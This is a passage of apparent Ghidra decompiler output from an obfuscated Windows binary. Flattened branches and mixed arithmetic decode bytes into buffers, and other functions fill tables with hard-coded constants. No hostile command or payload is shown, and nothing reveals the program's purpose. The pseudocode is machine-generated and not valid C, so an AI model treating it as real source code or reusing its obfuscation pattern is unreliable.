        local_res8 = bVar1 + cVar3 + 0xa2U + (cVar3 + 0xa2U & bVar1) * -2 + 0x92;
        goto LAB_140002fbd;
      }
      if (uVar2 == uVar8 + 5) {
        local_res8 = (cVar3 - 0x12U) + ('?' - (cVar3 - 0x12U & bVar1)) * '\x02' + bVar1;
        goto LAB_140002f85;
      }
      if (uVar2 != uVar8 + 7) goto LAB_140002640;
      local_res8 = cVar3 + bVar1 + (cVar3 + 0x3aU & bVar1) * -2 + 0xa4;
    }
    goto LAB_1400025c2;
  }
  local_res8 = ('\x0e' - (cVar3 + 0x26U & bVar1)) * '\x02' + bVar1 + cVar3;
LAB_140002640:
  if (uVar4 < uVar8) {
    DAT_140a61990 = (longlong)in_stack_0159c960;
    return;
  }
  if (uVar8 + 0x80 <= uVar2) {
    if (uVar2 == uVar8 + 1) {
      cVar6 = bVar1 + (cVar3 + 0x6aU & bVar1) * -2 + -0x7c;
      goto LAB_140002f20;
    }
    if (uVar2 != uVar8 + 3) {
      if (uVar2 != uVar8 + 4) {
        if (uVar2 != uVar8 + 9) goto LAB_1400026a3;
        local_res8 = ('\"' - (cVar3 - 0x36U & bVar1)) * '\x02' + bVar1 + cVar3;
        uVar4 = uVar4 + *(byte *)((longlong)&local_28 + uVar4) + uVar8 + 1;
        goto LAB_1400025c2;
      }
      local_res8 = bVar1 + (cVar3 + 0x32U & bVar1) * -2 + -0x2c + cVar3;
      goto LAB_140002fef;
    }
    local_res8 = ('\x16' - (cVar3 + 0x4eU & bVar1)) * '\x02' + bVar1 + cVar3;
    goto LAB_140002f85;
  }
  local_res8 = ('&' - (cVar3 + 0x1eU & bVar1)) * '\x02' + bVar1 + cVar3;
LAB_1400026a3:
  while (uVar7 = uVar8, uVar4 < uVar8 + uVar2) {
    while( true ) {
      do {
        uVar8 = uVar7;
        if (uVar2 == uVar8 + 0x42) {
          cVar6 = ('\x04' - (cVar3 + 0x54U & bVar1)) * '\x02' + bVar1;
          goto LAB_140002f20;
        }
        if (uVar2 == uVar8 + 3) {
          uVar8 = uVar8 + 1;
          local_res8 = (' ' - (cVar3 + 0xa0U & bVar1)) * '\x02' + bVar1 + cVar3;
          goto LAB_1400025c2;
        }
        if (uVar2 == uVar8 + 0x200) {
          local_res8 = ('<' - (cVar3 - 0x14U & bVar1)) * '\x02' + bVar1 + cVar3;
          goto LAB_1400025c2;
        }
        if (uVar2 == uVar8 + 6) {
          bVar9 = cVar3 + 0x38;
          goto LAB_140002c85;
        }
        if (uVar2 == uVar8 + 0x1000) {
          local_res8 = (cVar3 + bVar1 + (cVar3 + 0x84U & bVar1) * -2) - 0x18;
          goto LAB_140002fbd;
        }
        if (uVar2 == uVar8 + 10) {
          local_res8 = ('\x10' - (cVar3 - 0x30U & bVar1)) * '\x02' + bVar1 + cVar3;
          goto LAB_140002fc0;
        }
        if (uVar2 == uVar8 + 0x41) {
          local_res8 = (',' - (cVar3 + 0x1cU & bVar1)) * '\x02' + bVar1 + cVar3;
          goto LAB_140002fef;
        }
        if (uVar2 == uVar8 + 0x28) {
          local_res8 = bVar1 + (cVar3 + 0x68U & bVar1) * -2 + -0x70 + cVar3;
          goto LAB_140003016;
        }
        if (uVar2 == uVar8 + 1) {
          local_res8 = (cVar3 + bVar1 + (cVar3 + 0xb4U & bVar1) * -2) - 0x38;
          uVar4 = uVar4 + *(byte *)((longlong)&local_28 + uVar4) + uVar8 + 1;
          goto LAB_1400025c2;
        }
        uVar7 = uVar8;
      } while (uVar2 == uVar8 + 100);
      uVar2 = uVar8 + 0x7a;
      uVar7 = uVar8 + 0x7e;
      if (uVar2 < uVar8 + 0x9e) {
        local_res8 = ('*' - (cVar3 + 0x72U & bVar1)) * '\x02' + cVar3 + bVar1;
        goto LAB_1400025b0;
      }
      if (uVar2 < uVar8 + 0xa8) {
        local_res8 = bVar1 + cVar3 + (cVar3 + 0xbeU & bVar1) * -2 + 0x8c;
        goto LAB_1400025c0;
      }
      if (uVar2 < uVar8 + 0xc0) {
        local_res8 = bVar1 + (cVar3 + 10U & bVar1) * -2 + -0x3c + cVar3;
        uVar8 = uVar7;
        goto LAB_1400025d5;
      }
      if (uVar2 < uVar8 + 0x81) {
        local_res8 = bVar1 + (cVar3 + 0x56U & bVar1) * -2 + -4 + cVar3;
        uVar8 = uVar7;
        goto LAB_140002640;
      }
      if (uVar2 < uVar8 + 0x27e) break;
      if (uVar2 < uVar8 + 0x84) {
        bVar9 = cVar3 - 0x12;
        cVar6 = '6';
        uVar8 = uVar7;
        goto LAB_140002a7f;
      }
      if (uVar2 < uVar8 + 0x107e) {
        cVar6 = bVar1 + (cVar3 + 0x3aU & bVar1) * -2 + -0x5c;
        uVar8 = uVar7;
        goto LAB_140002a40;
      }
      if (uVar2 < uVar8 + 0x88) {
        cVar6 = bVar1 + (cVar3 + 0x86U & bVar1) * -2 + -0x24;
        uVar8 = uVar7;
        goto LAB_140002a04;
      }
      if (uVar2 < uVar8 + 0xbf) {
        local_res8 = ('\n' - (cVar3 - 0x2eU & bVar1)) * '\x02' + bVar1 + cVar3;
        uVar8 = uVar7;
        goto LAB_1400029e4;
      }
      if (uVar8 + 0xa6 <= uVar2) {
        uVar2 = uVar8 + 0x47e;
        uVar7 = uVar8 + 0x47f;
        if (uVar8 + 0x488 < uVar2) {
          local_res8 = cVar3 + bVar1 + (cVar3 + 0x90U & bVar1) * -2 + 0xa0;
          uVar4 = uVar4 + *(byte *)((longlong)&local_28 + uVar4) + uVar7 + 1;
          uVar8 = uVar7;
          goto LAB_1400025c2;
        }
        if (uVar8 + 0x4f9 < uVar2) {
          local_res8 = bVar1 + (cVar3 - 0x24U & bVar1) * -2 + -0x28 + cVar3;
          uVar8 = uVar7;
          goto LAB_140003016;
        }
        if (uVar8 + 0x49f < uVar2) {
          local_res8 = ('\b' - (cVar3 + 0x28U & bVar1)) * '\x02' + bVar1 + cVar3;
          uVar8 = uVar7;
          goto LAB_140002fef;
        }
        if (uVar8 + 0x4a9 < uVar2) {
          local_res8 = ('$' - (cVar3 + 0x74U & bVar1)) * '\x02' + bVar1 + cVar3;
          uVar8 = uVar7;
          goto LAB_140002fc0;
        }
        if (uVar8 + 0x4c1 < uVar2) {
          local_res8 = cVar3 + bVar1 + (cVar3 - 0x40U & bVar1) * -2 + 0x80;
          uVar8 = uVar7;
          goto LAB_140002fbd;
        }
        if (uVar8 + 0x482 < uVar2) {
          local_res8 = bVar1 + (cVar3 + 0xcU & bVar1) * -2 + -0x48 + cVar3;
          uVar8 = uVar7;
          goto LAB_140002f85;
        }
        if (uVar8 + 0x67f < uVar2) {
          local_res8 = (cVar3 + bVar1 + (cVar3 + 0x58U & bVar1) * -2) - 0x10;
          uVar8 = uVar7;
          goto LAB_1400025c2;
        }
        if (uVar8 + 0x485 < uVar2) {
          local_res8 = ('\x14' - (cVar3 + 0xa4U & bVar1)) * '\x02' + bVar1 + cVar3;
          uVar8 = uVar8 + 0x480;
          goto LAB_1400025c2;
        }
        if (uVar8 + 0x147f < uVar2) {
          cVar6 = ('0' - (cVar3 - 0x10U & bVar1)) * '\x02' + bVar1;
          uVar8 = uVar7;
          goto LAB_140002f20;
        }
        if (uVar2 <= uVar8 + 0x489) {
          uVar2 = uVar8 + 0x4ff;
          uVar7 = uVar8 + 0x540;
        }
      }
    }
    local_res8 = ('\x1a' - (cVar3 + 0xa2U & bVar1)) * '\x02' + bVar1 + cVar3;
    uVar8 = uVar7;
  }
  if (uVar8 + 6 <= uVar2) {
    if (uVar2 == uVar8 + 1) {
      local_res8 = cVar3 + bVar1 + (cVar3 + 0x3cU & bVar1) * -2 + 0x98;
      uVar4 = uVar4 + *(byte *)((longlong)&local_28 + uVar4) + uVar8 + 1;
    }
    else {
      if (uVar2 == uVar8 + 3) {
        local_res8 = ('\x04' - (cVar3 - 0x2cU & bVar1)) * '\x02' + bVar1 + cVar3;
        goto LAB_140002fef;
      }
      if (uVar2 != uVar8 + 2) {
        if (uVar2 != uVar8 + 5) {
          if (uVar2 == uVar8 + 4) {
            bVar9 = cVar3 + 0xb8;
LAB_140002c85:
            local_res8 = bVar1 + (bVar9 & bVar1) * -2 + -0x50 + cVar3;
            goto LAB_140002f85;
          }
          if (uVar2 != uVar8 + 7) goto LAB_140002a8b;
          cVar6 = (',' - (cVar3 + 0x9cU & bVar1)) * '\x02' + bVar1;
          goto LAB_140002f20;
        }
        local_res8 = ('<' - (cVar3 + 0x6cU & bVar1)) * '\x02' + bVar1 + cVar3;
        goto LAB_140002fbd;
      }
      local_res8 = (' ' - (cVar3 + 0x20U & bVar1)) * '\x02' + bVar1 + cVar3;
LAB_140002fc0:
      uVar4 = uVar4 - local_res8;
    }
    goto LAB_1400025c2;
  }
  bVar9 = cVar3 + 0x26;
  cVar6 = '\x0e';
LAB_140002a7f:
  local_res8 = (cVar6 - (bVar9 & bVar1)) * '\x02' + bVar1 + cVar3;
LAB_140002a8b:
  if (uVar8 + uVar2 == 0x42) {
    local_res8 = (cVar3 + 0xbcU & bVar1) * -2 + -0x68 + cVar3;
LAB_140002fef:
    bVar9 = (cVar3 - 0x1eU) + (cVar3 - 0x1eU & bVar1) * -2 + -0x2e + bVar1;
    *(byte *)((longlong)&local_28 + uVar4) = bVar9;
    uVar4 = uVar4 - ((ulonglong)bVar9 + uVar8 + 1);
    uVar8 = uVar8 + 1;
LAB_140003016:
    bVar9 = (char)uVar4 + 8;
    uVar2 = uVar2 + 1;
    *(byte *)((longlong)&local_28 + uVar4) = bVar9 + (bVar9 & bVar1) * -2 + -0x38 + bVar1;
    lVar5 = uVar4 + (-1 - uVar2);
    uVar4 = lVar5 + (&bStack_29)[lVar5 + 1] + uVar8 + 1;
    goto LAB_1400025c2;
  }
  if (uVar8 + 0x61 < uVar2) {
    cVar6 = bVar1 + (cVar3 + 0xeU & bVar1) * -2 + -0x54;
LAB_140002a40:
    local_res8 = cVar6 + cVar3;
LAB_140002a43:
    if (0x1f < uVar2) {
      local_res8 = ((bVar1 - (cVar3 + 0x70U & bVar1)) + '0') * '\x02' + cVar3;
LAB_140002f85:
      *(byte *)((longlong)&local_28 + uVar4) =
           cVar3 + 0x96U + (cVar3 + 0x96U & bVar1) * -2 + -0x1a + bVar1 + local_res8;
LAB_140002fbd:
      uVar2 = uVar2 + uVar8;
      goto LAB_140002fc0;
    }
    if (uVar8 + 1000 < uVar2) {
      cVar6 = bVar1 + (cVar3 + 0x2cU & bVar1) * -2 + -8;
LAB_140002a04:
      local_res8 = cVar6 + cVar3;
    }
    else {
      if (uVar2 == uVar8 + 1) {
        local_res8 = ('\x18' - (cVar3 + 0x78U & bVar1)) * '\x02' + bVar1 + cVar3;
        uVar4 = uVar4 + *(byte *)((longlong)&local_28 + uVar4) + uVar8 + 1;
        goto LAB_1400025c2;
      }
      if (uVar2 == uVar8 + 2) {
        local_res8 = ('4' - (cVar3 - 0x3cU & bVar1)) * '\x02' + bVar1 + cVar3;
        goto LAB_140003016;
      }
      if (uVar2 == uVar8 + 3) {
        local_res8 = (cVar3 + bVar1 + (cVar3 + 0x5cU & bVar1) * -2) - 0x28;
        goto LAB_140002fc0;
      }
      if (uVar2 == uVar8 + 5) {
        local_res8 = ('\b' - (cVar3 + 0xa8U & bVar1)) * '\x02' + bVar1 + cVar3;
        goto LAB_140002fbd;
      }
      if (uVar2 == uVar8 + 6) {
        uVar8 = uVar8 + 1;
        local_res8 = cVar3 + bVar1 + (cVar3 + 0x8cU & bVar1) * -2 + 0xb8;
        goto LAB_1400025c2;
      }
      if (uVar2 == uVar8 + 8) {
        cVar6 = bVar1 + (cVar3 - 0x28U & bVar1) * -2 + -0x10;
        goto LAB_140002f20;
      }
    }
    if (uVar8 < 9) {
LAB_1400029e4:
      *(byte *)((longlong)&local_28 + uVar4) = local_res8;
      uVar4 = uVar4 + 1;
      goto LAB_1400025c2;
    }
    local_res8 = (('\x14' - (cVar3 + 0x24U & bVar1)) * '\x02' + bVar1 + cVar3) * '\x02';
  }
  else {
    if (uVar2 != uVar8 + 1) {
      if (uVar2 != uVar8 + 2) {
        if (uVar2 != uVar8 + 3) {
          if (uVar2 == uVar8 + 4) {
            local_res8 = (cVar3 + bVar1 + (cVar3 + 0x8aU & bVar1) * -2) - 0x3c;
            goto LAB_140002fbd;
          }
          if (uVar2 == uVar8 + 6) {
            local_res8 = (cVar3 + bVar1 + (cVar3 - 0x2aU & bVar1) * -2) - 4;
            goto LAB_140002fc0;
          }
          goto LAB_140002a43;
        }
        local_res8 = bVar1 + (cVar3 + 0x3eU & bVar1) * -2 + -0x74 + cVar3;
        goto LAB_140002f85;
      }
      local_res8 = ('*' - (cVar3 - 0xeU & bVar1)) * '\x02' + bVar1 + cVar3;
      goto LAB_1400025c2;
    }
    cVar6 = bVar1 + (cVar3 + 0x5aU & bVar1) * -2 + -0x1c;
LAB_140002f20:
    local_res8 = cVar6 + cVar3;
  }
  *(byte *)((longlong)&local_28 + uVar4) = cVar3 + 0x4aU + (cVar3 + 0x4aU & bVar1) * -2 + -6 + bVar1
  ;
  uVar8 = uVar8 + 1;
  goto LAB_1400025c2;
}



/* ==================================================================== */
/* FUN_1400030e0 @ 1400030e0 */

void FUN_1400030e0(void)

{
  ulonglong uVar1;
  byte bVar2;
  ulonglong uVar3;
  byte bVar4;
  ulonglong uVar5;
  ulonglong uVar6;
  char cVar7;
  char cVar8;
  ulonglong uVar9;
  longlong lVar10;
  byte local_res8;
  int in_stack_012f6c83;
  int in_stack_017396cc;
  byte bStack_29;
  int local_28;
  undefined8 local_24;
  undefined4 local_1c;
  undefined2 local_18;
  undefined1 local_16;

  local_24 = 0;
  local_1c = 0;
  local_18 = 0;
  local_16 = 0;
  local_28 = -0x44d9b44e;
LAB_140003120:
  uVar3 = DAT_140a618c8;
  uVar5 = DAT_140a618d0;
LAB_140003130:
  uVar9 = 0;
  uVar6 = uVar5;
LAB_140003133:
  if (0x12 < uVar9) {
    DAT_140a619a0 = (longlong)local_28;
    return;
  }
  bVar2 = *(byte *)((longlong)&local_28 + uVar9);
LAB_140003142:
  if (uVar9 < uVar3) {
    DAT_140a619a0 = (longlong)in_stack_012f6c83;
    return;
  }
  cVar8 = (char)uVar9;
  if (uVar6 + 1 <= uVar3) {
    if (uVar3 == uVar6 + 1) {
      local_res8 = (cVar8 + 0x25U + bVar2 + (bVar2 & cVar8 + 0x25U) * -2) - 3;
      uVar9 = uVar9 + *(byte *)((longlong)&local_28 + uVar9) + uVar6 + 1;
    }
    else {
      if (uVar3 == uVar6 + 3) {
        local_res8 = (bVar2 + cVar8 + 1U + (cVar8 + 1U & bVar2) * -2) - 7;
        goto LAB_140003ac3;
      }
      if (uVar3 == uVar6 + 5) {
        local_res8 = (bVar2 + cVar8 + 0x4bU + (cVar8 + 0x4bU & bVar2) * -2) - 0xd;
        goto LAB_140003a76;
      }
      if (uVar3 != uVar6 + 4) {
        if (uVar3 != uVar6 + 2) goto LAB_1400031a7;
        cVar7 = bVar2 + (cVar8 + 0x95U & bVar2) * -2 + -0x7e;
        goto LAB_140003a18;
      }
      local_res8 = cVar8 + bVar2 + (cVar8 + 0xb9U & bVar2) * -2 + 0xaa;
    }
    goto LAB_140003133;
  }
  local_res8 = bVar2 + (cVar8 + 0xb7U & bVar2) * -2 + -0x4a + cVar8;
LAB_1400031a7:
  if (uVar9 < uVar6) {
    DAT_140a619a0 = (longlong)in_stack_017396cc;
    return;
  }
  if (uVar3 < uVar6 + 0x2a) {
    local_res8 = bVar2 + (cVar8 + 3U & bVar2) * -2 + -0x12 + cVar8;
  }
  else {
    if (uVar3 == uVar6 + 1) {
      cVar7 = ('-' - (cVar8 + 0x71U & bVar2)) * '\x02' + bVar2;
      goto LAB_140003a18;
    }
    if (uVar3 == uVar6 + 2) {
      local_res8 = bVar2 + (cVar8 + 0xbbU & bVar2) * -2 + -0x62 + cVar8;
      goto LAB_140003a76;
    }
    if (uVar3 == uVar6 + 5) {
      local_res8 = ('\x05' - (cVar8 + 0x29U & bVar2)) * '\x02' + bVar2 + cVar8;
      goto LAB_140003a91;
    }
  }
  while (uVar5 = uVar6, uVar9 < uVar6 + uVar3) {
    while( true ) {
      do {
        uVar6 = uVar5;
        if (uVar3 == uVar6 + 8) {
          cVar7 = ('\x1a' - (cVar8 + 0xa2U & bVar2)) * '\x02' + bVar2;
          goto LAB_140003a18;
        }
        if (uVar3 == uVar6 + 6) {
          uVar6 = uVar6 + 1;
          local_res8 = cVar8 + bVar2 + (cVar8 + 0x10U & bVar2) * -2 + 0xa0;
          goto LAB_140003133;
        }
        if (uVar3 == uVar6 + 0x42) {
          local_res8 = ('\x06' - (cVar8 + 0x7eU & bVar2)) * '\x02' + bVar2 + cVar8;
          goto LAB_140003133;
        }
        if (uVar3 == uVar6 + 0x40) {
          local_res8 = ('<' - (cVar8 - 0x14U & bVar2)) * '\x02' + bVar2 + cVar8;
          goto LAB_140003a76;
        }
        if (uVar3 == uVar6 + 0x28) {
          local_res8 = (cVar8 + bVar2 + (cVar8 + 0x5aU & bVar2) * -2) - 0x1c;
          goto LAB_140003a91;
        }
        if (uVar3 == uVar6 + 0x20) {
          local_res8 = ('(' - (cVar8 - 0x38U & bVar2)) * '\x02' + bVar2 + cVar8;
          goto LAB_140003a94;
        }
        if (uVar3 == uVar6 + 0x10) {
          local_res8 = bVar2 + (cVar8 + 0x36U & bVar2) * -2 + -0x44 + cVar8;
          goto LAB_140003ac3;
        }
        if (uVar3 == uVar6 + 1000) {
          local_res8 = ('\x14' - (cVar8 + 0xa4U & bVar2)) * '\x02' + bVar2 + cVar8;
          goto LAB_140003ae7;
        }
        if (uVar3 == uVar6 + 0x200) {
          local_res8 = cVar8 + bVar2 + (cVar8 + 0x12U & bVar2) * -2 + 0x94;
          uVar9 = uVar9 + *(byte *)((longlong)&local_28 + uVar9) + uVar6 + 1;
          goto LAB_140003133;
        }
        uVar5 = uVar6;
      } while (uVar3 == uVar6 + 0x80);
      uVar1 = uVar6 + 0x1000;
      uVar5 = uVar6 + 0x1064;
      if (uVar1 < uVar6 + 0x1464) {
        local_res8 = ('\x11' - (cVar8 + 0xa5U & bVar2)) * '\x02' + cVar8 + bVar2;
        goto LAB_140003120;
      }
      uVar3 = uVar1;
      if (uVar1 < uVar6 + 0x144c) {
        local_res8 = bVar2 + cVar8 + (cVar8 + 0x13U & bVar2) * -2 + 0x8e;
        goto LAB_140003130;
      }
      if (uVar1 < uVar6 + 0x1264) {
        local_res8 = bVar2 + (cVar8 + 0x81U & bVar2) * -2 + -6 + cVar8;
        uVar6 = uVar5;
        goto LAB_140003142;
      }
      if (uVar1 < uVar6 + 0x10e4) {
        local_res8 = ('3' - (cVar8 - 0x11U & bVar2)) * '\x02' + bVar2 + cVar8;
        uVar6 = uVar5;
        goto LAB_1400031a7;
      }
      if (uVar1 < uVar6 + 0x10be) break;
      uVar3 = uVar6 + 0x10a5;
      if (uVar1 < uVar3) {
        cVar7 = ('\x1f' - (cVar8 - 0x35U & bVar2)) * '\x02' + bVar2;
        uVar3 = uVar1;
        uVar6 = uVar5;
        goto LAB_1400035d6;
      }
      if (uVar1 < uVar6 + 0x10de) {
        cVar7 = bVar2 + (cVar8 + 0x39U & bVar2) * -2 + -0x56;
        uVar3 = uVar1;
        uVar6 = uVar5;
        goto LAB_140003599;
      }
      if (uVar1 < uVar6 + 0x10c5) {
        bVar4 = cVar8 + 0xa7;
        cVar7 = '\v';
        uVar3 = uVar1;
        uVar6 = uVar5;
        goto LAB_140003554;
      }
      if (uVar1 < uVar6 + 0x2064) {
        local_res8 = cVar8 + bVar2 + (cVar8 + 0x15U & bVar2) * -2 + 0x82;
        uVar3 = uVar1;
        uVar6 = uVar5;
        goto LAB_14000353c;
      }
      uVar5 = uVar6 + 0x10a7;
      if (uVar6 + 0x1121 < uVar3) {
        local_res8 = ('\b' - (cVar8 + 0xa8U & bVar2)) * '\x02' + bVar2 + cVar8;
        uVar9 = uVar9 + *(byte *)((longlong)&local_28 + uVar9) + uVar5 + 1;
        uVar6 = uVar5;
        goto LAB_140003133;
      }
      if (uVar6 + 0x1108 < uVar3) {
        local_res8 = ('>' - (cVar8 + 0x16U & bVar2)) * '\x02' + bVar2 + cVar8;
        uVar6 = uVar5;
        goto LAB_140003ae7;
      }
      if (uVar6 + 0x10ab < uVar3) {
        local_res8 = bVar2 + (cVar8 + 0x84U & bVar2) * -2 + -0x18 + cVar8;
        uVar6 = uVar5;
        goto LAB_140003ac3;
      }
      if (uVar6 + 0x10aa < uVar3) {
        local_res8 = ('*' - (cVar8 - 0xeU & bVar2)) * '\x02' + bVar2 + cVar8;
        uVar6 = uVar5;
        goto LAB_140003a94;
      }
      if (uVar6 + 0x10a9 < uVar3) {
        local_res8 = (cVar8 + bVar2 + (cVar8 + 0x60U & bVar2) * -2) - 0x40;
        uVar6 = uVar5;
        goto LAB_140003a91;
      }
      if (uVar6 + 0x10a8 < uVar3) {
        local_res8 = ('\x16' - (cVar8 - 0x32U & bVar2)) * '\x02' + bVar2 + cVar8;
        uVar6 = uVar5;
        goto LAB_140003a76;
      }
      if (uVar6 + 0x10d1 < uVar3) {
        local_res8 = cVar8 + bVar2 + (cVar8 + 0x3cU & bVar2) * -2 + 0x98;
        uVar6 = uVar5;
        goto LAB_140003133;
      }
      if (uVar6 + 0x10b0 < uVar3) {
        local_res8 = ('\x02' - (cVar8 + 0xaaU & bVar2)) * '\x02' + bVar2 + cVar8;
        uVar6 = uVar6 + 0x10a8;
        goto LAB_140003133;
      }
      if (uVar6 + 0x10af < uVar3) {
        cVar7 = ('8' - (cVar8 + 0x18U & bVar2)) * '\x02' + bVar2;
        uVar6 = uVar5;
        goto LAB_140003a18;
      }
      if (uVar3 <= uVar6 + 0x10ad) {
        uVar3 = uVar6 + 0x10b7;
        uVar5 = uVar6 + 0x10bc;
      }
    }
    local_res8 = bVar2 + (cVar8 + 0x5dU & bVar2) * -2 + -0x2e + cVar8;
    uVar6 = uVar5;
  }
  if (uVar6 + 9 <= uVar3) {
    if (uVar3 == uVar6 + 1) {
      local_res8 = (cVar8 + bVar2 + (cVar8 + 6U & bVar2) * -2) - 0x24;
      uVar9 = uVar9 + *(byte *)((longlong)&local_28 + uVar9) + uVar6 + 1;
    }
    else {
      if (uVar3 == uVar6 + 2) {
        local_res8 = bVar2 + (cVar8 - 0x1eU & bVar2) * -2 + -0x4c + cVar8;
        goto LAB_140003ac3;
      }
      if (uVar3 != uVar6 + 3) goto LAB_1400035d9;
      local_res8 = ('\x10' - (cVar8 + 0x50U & bVar2)) * '\x02' + bVar2 + cVar8;
LAB_140003a94:
      uVar9 = uVar9 - local_res8;
    }
    goto LAB_140003133;
  }
  cVar7 = bVar2 + (cVar8 + 0xb7U & bVar2) * -2 + -0x4a;
LAB_1400035d6:
  local_res8 = cVar7 + cVar8;
LAB_1400035d9:
  if (uVar6 + uVar3 == 0x61) {
    local_res8 = ('.' - (cVar8 - 0x3aU & bVar2)) * '\x02' + cVar8;
LAB_140003ac3:
    bVar4 = cVar8 + 0x7dU + (cVar8 + 0x7dU & bVar2) * -2 + -0x6b + bVar2;
    *(byte *)((longlong)&local_28 + uVar9) = bVar4;
    uVar9 = uVar9 - ((ulonglong)bVar4 + uVar6 + 1);
    uVar6 = uVar6 + 1;
LAB_140003ae7:
    bVar4 = (char)uVar9 + 0x34;
    uVar3 = uVar3 + 1;
    *(byte *)((longlong)&local_28 + uVar9) = bVar2 + (bVar2 & bVar4) * -2 + -0x6c + bVar4;
    lVar10 = uVar9 + (-1 - uVar3);
    uVar9 = lVar10 + (&bStack_29)[lVar10 + 1] + uVar6 + 1;
    goto LAB_140003133;
  }
  if (uVar6 + 0x80 < uVar3) {
    cVar7 = ('/' - (cVar8 + 0x9bU & bVar2)) * '\x02' + bVar2;
LAB_140003599:
    local_res8 = cVar7 + cVar8;
LAB_14000359c:
    if (0x59 < uVar3) {
      local_res8 = bVar2 * '\x02' + (cVar8 + 0x58U & bVar2) * -2 + -0x10 + cVar8;
LAB_140003a76:
      *(byte *)((longlong)&local_28 + uVar9) =
           cVar8 + 0xfU + (cVar8 + 0xfU & bVar2) * -2 + -0x69 + bVar2 + local_res8;
LAB_140003a91:
      uVar3 = uVar3 + uVar6;
      goto LAB_140003a94;
    }
    if (uVar6 + 3 < uVar3) {
      bVar4 = cVar8 + 0x9e;
      cVar7 = '&';
LAB_140003554:
      local_res8 = (cVar7 - (bVar4 & bVar2)) * '\x02' + bVar2 + cVar8;
    }
    else {
      if (uVar3 == uVar6 + 1) {
        local_res8 = cVar8 + bVar2 + (cVar8 + 0xcU & bVar2) * -2 + 0xb8;
        uVar9 = uVar9 + *(byte *)((longlong)&local_28 + uVar9) + uVar6 + 1;
        goto LAB_140003133;
      }
      if (uVar3 == uVar6 + 2) {
        local_res8 = ('\x12' - (cVar8 + 0x7aU & bVar2)) * '\x02' + bVar2 + cVar8;
        goto LAB_140003ae7;
      }
      if (uVar3 == uVar6 + 3) {
        local_res8 = (cVar8 + bVar2 + (cVar8 + 0x56U & bVar2) * -2) - 4;
        goto LAB_140003a94;
      }
      if (uVar3 == uVar6 + 4) {
        local_res8 = ('4' - (cVar8 - 0x3cU & bVar2)) * '\x02' + bVar2 + cVar8;
        goto LAB_140003a91;
      }
      if (uVar3 == uVar6 + 6) {
        local_res8 = (' ' - (cVar8 + 0xa0U & bVar2)) * '\x02' + bVar2 + cVar8;
        goto LAB_140003133;
      }
      if (uVar3 == uVar6 + 5) {
        uVar6 = uVar6 + 1;
        local_res8 = cVar8 + bVar2 + (cVar8 + 0xeU & bVar2) * -2 + 0xac;
        goto LAB_140003133;
      }
    }
    if (uVar6 < 0x20) {
LAB_14000353c:
      *(byte *)((longlong)&local_28 + uVar9) = local_res8;
      uVar9 = uVar9 + 1;
      goto LAB_140003133;
    }
    local_res8 = (('\x02' - (cVar8 - 0x16U & bVar2)) * '\x02' + bVar2 + cVar8) * '\x02';
  }
  else {
    if (uVar3 != uVar6 + 1) {
      if (uVar3 == uVar6 + 2) {
        uVar6 = uVar6 + 1;
        local_res8 = ('\x1b' - (cVar8 + 0x77U & bVar2)) * '\x02' + bVar2 + cVar8;
      }
      else {
        if (uVar3 != uVar6 + 3) {
          if (uVar3 == uVar6 + 5) {
            local_res8 = (cVar8 + bVar2 + (cVar8 + 0x2fU & bVar2) * -2) - 0x1a;
            goto LAB_140003a94;
          }
          if (uVar3 == uVar6 + 7) {
            local_res8 = (')' - (cVar8 + 0x9dU & bVar2)) * '\x02' + bVar2 + cVar8;
            goto LAB_140003ac3;
          }
          goto LAB_14000359c;
        }
        local_res8 = cVar8 + bVar2 + (cVar8 - 0x1bU & bVar2) * -2 + 0xa2;
      }
      goto LAB_140003133;
    }
    cVar7 = bVar2 + (cVar8 + 9U & bVar2) * -2 + -0x36;
LAB_140003a18:
    local_res8 = cVar7 + cVar8;
  }
  *(byte *)((longlong)&local_28 + uVar9) =
       cVar8 + 0xa1U + (cVar8 + 0xa1U & bVar2) * -2 + -0x67 + bVar2;
  uVar6 = uVar6 + 1;
  goto LAB_140003133;
}



/* ==================================================================== */
/* FUN_140003bd0 @ 140003bd0 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_140003bd0(void)

{
  longlong lVar1;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined8 local_60;
  undefined8 local_58;
  undefined8 local_50;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  undefined8 local_18;
  undefined8 local_10;

  local_78 = 0x9aef9d;
  local_70 = 0x9c7dda;
  local_68 = 0x9d44a6;
  local_60 = 0x9df281;
  local_58 = 0x9f0a96;
  local_50 = 0xa12253;
  local_48 = 0xa1e642;
  local_40 = 0xa4ca3e;
  local_38 = 0xac45f1;
  local_30 = 0xac8ada;
  local_28 = 0xb326f8;
  local_20 = 0xb33248;
  local_18 = 0xa64fdf;
  local_10 = 0xb31d09;
  DAT_140a61908 = (void *)FUN_14000e6b0(0x70);
  lVar1 = (longlong)DAT_140a61908 + 0x70;
  DAT_140a61910 = DAT_140a61908;
  _DAT_140a61918 = lVar1;
  memmove(DAT_140a61908,&local_78,0x70);
  DAT_140a61910 = (void *)lVar1;
  atexit((_func_5014 *)&LAB_140053380);
  return;
}



/* ==================================================================== */
/* FUN_140003ca0 @ 140003ca0 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_140003ca0(void)

{
  longlong lVar1;
  undefined8 local_c8;
  undefined8 local_c0;
  undefined8 local_b8;
  undefined8 local_b0;
  undefined8 local_a8;
  undefined8 local_a0;
  undefined8 local_98;
  undefined8 local_90;
  undefined8 local_88;
  undefined8 local_80;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined8 local_60;
  undefined8 local_58;
  undefined8 local_50;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  undefined8 local_18;
  undefined8 local_10;

  local_c8 = 0xa469f9;
  local_c0 = 0x9a02aa;
  local_b8 = 0x9a1199;
  local_b0 = 0x9a4aea;
  local_a8 = 0x9a58e2;
  local_a0 = 0x9a8623;
  local_98 = 0x9abd39;
  local_90 = 0x9dcff3;
  local_88 = 0xa6390a;
  local_80 = 0x4b0711;
  local_78 = 0x4bad1e;
  local_70 = 0x507124;
  local_68 = 0x9a6827;
  local_60 = 0x9a77c0;
  local_58 = 0x9a940f;
  local_50 = 0x9ae357;
  local_48 = 0x9aa641;
  local_40 = 0x9ab3e1;
  local_38 = 0x9c02aa;
  local_30 = 0x9c75bd;
  local_28 = 0xa244c4;
  local_20 = 0xa49501;
  local_18 = 0xa5b313;
